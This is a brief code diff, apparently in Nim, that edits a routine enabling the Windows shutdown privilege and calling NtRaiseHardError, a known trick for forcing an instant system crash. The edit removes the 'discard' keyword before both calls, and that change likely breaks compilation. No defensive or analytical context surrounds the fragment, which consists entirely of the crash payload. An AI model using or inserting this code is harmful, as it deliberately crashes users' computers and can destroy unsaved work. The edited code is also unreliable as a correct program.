@@ -12,6 +12,6 @@ var
     response: ULONG
 
 # SE_SHUTDOWN_PRIVILEGE = 19
-discard RtlAdjustPrivilege(19, TRUE, FALSE, &prev)
+RtlAdjustPrivilege(19, TRUE, FALSE, &prev)
 
-discard NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);
+NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);
